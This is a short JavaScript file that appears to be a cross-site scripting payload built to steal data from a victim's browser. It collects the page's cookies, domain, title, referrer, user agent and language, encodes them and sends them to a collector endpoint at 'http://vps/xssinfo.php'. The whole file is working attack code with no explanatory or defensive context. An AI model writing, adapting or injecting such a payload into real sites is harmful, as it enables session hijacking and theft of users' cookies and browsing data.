http_server = "http://vps/xssinfo.php?info=";

info = {};
info.ua = navigator.userAgent;
info.lang = navigator.language;
info.referrer = document.referrer;
info.title = document.title;
info.domain = document.domain;
info.cookie = document.cookie;

function json2str(o) {
	var arr = [];
	var fmt = function(s) {
		if (typeof s == 'object' && s != null) return json2str(s);
		return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
	}
	for (var i in o) arr.push("'" + i + "':" + fmt(o[i]));
	return '{' + arr.join(',') + '}';
} 

info_str = json2str(info);


xhr = new XMLHttpRequest();
xhr.open('GET',http_server+btoa(escape(info_str)));
xhr.send(null);
